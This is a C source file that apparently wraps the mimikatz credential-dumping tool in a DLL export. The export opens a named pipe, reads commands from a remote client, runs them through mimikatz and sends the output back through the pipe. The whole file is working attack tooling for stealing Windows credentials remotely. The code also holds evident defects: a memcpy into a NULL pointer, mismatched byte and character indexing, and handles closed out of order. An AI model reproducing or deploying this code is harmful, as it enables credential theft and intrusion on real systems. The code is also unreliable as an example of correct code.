#include "mimikatz.h"

void RedirectIO(FILE* hFrom, HANDLE hTo)
{
	int fd = _open_osfhandle((intptr_t)hTo, _O_WRONLY | _O_TEXT);
	_dup2(fd, _fileno(hFrom));
	setvbuf(hFrom, NULL, _IONBF, 0); //Disable buffering.
}

void mimikatz_end_noexit()
{
	mimikatz_initOrClean(FALSE);
#if !defined(_POWERKATZ)
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
}

__declspec(dllexport) int smb_server_wmain(LPVOID lpUserdata, DWORD nUserdataLen)
{
	if (nUserdataLen) {
		DWORD length = 14 + nUserdataLen;
		LPSTR namedPipeName = (LPSTR)malloc(length);
		//wsprintf(namedPipeName, L"\\\\.\\pipe\\%s", (LPCWSTR)lpUserdata);
		sprintf_s(namedPipeName, length, "\\\\.\\pipe\\%s", (LPCSTR)lpUserdata);
		HANDLE hPipe = NULL;
		BOOL fSuccess;
		char buffer[1024];
		char* pt = NULL;
		wchar_t wBuffer[1024];
		DWORD dwRead;
		ZeroMemory(&buffer, sizeof(buffer));
		ZeroMemory(&wBuffer, sizeof(wBuffer));
		int argc = 0;
		wchar_t** argv;
		size_t max;
		int bytesCopied;
		int i = 0;
		NTSTATUS status = STATUS_SUCCESS;
		hPipe = CreateNamedPipeA(
			namedPipeName,
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
			1,
			4096 * 4096,
			4096 * 4096,
			INFINITE,
			NULL);

		if (hPipe == INVALID_HANDLE_VALUE)
		{
			free(namedPipeName);
			return -1;
		}

		if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
		{
			fSuccess = ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
			if (fSuccess == FALSE)
			{
				free(namedPipeName);
				return -1;
			}
			mbtowc(NULL, NULL, 0);  /* reset mbtowc */
			max = strlen(buffer);
			memcpy(pt, &buffer, sizeof(buffer));
			//pt = &buffer;
			while (max > 0) {
				bytesCopied = mbtowc(&wBuffer[i], pt, max);
				if (bytesCopied < 1) break;
				i += bytesCopied; pt += bytesCopied; max -= bytesCopied;
			}
			RedirectIO(stdout, hPipe);
			RedirectIO(stderr, hPipe);
			if (argv = CommandLineToArgvW(wBuffer, &argc))
			{
				mimikatz_begin();
				for (i = 0; (i < argc) && (status != STATUS_FATAL_APP_EXIT); i++)
				{
					kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
					status = mimikatz_dispatchCommand(argv[i]);
				}
				LocalFree(argv);
			}
			kprintf(L"EOF\n");
			FlushFileBuffers(hPipe);
			/*outputBufferElements = 0xff;
			outputBufferElementsPosition = 0;
			if (outputBuffer = (wchar_t*)LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
				wmain(argc, argv);*/
			mimikatz_end_noexit();
			CloseHandle(hPipe);
			DisconnectNamedPipe(hPipe);
		}
		free(namedPipeName);
		return status;
	}
	else {
		return -1;
	}
}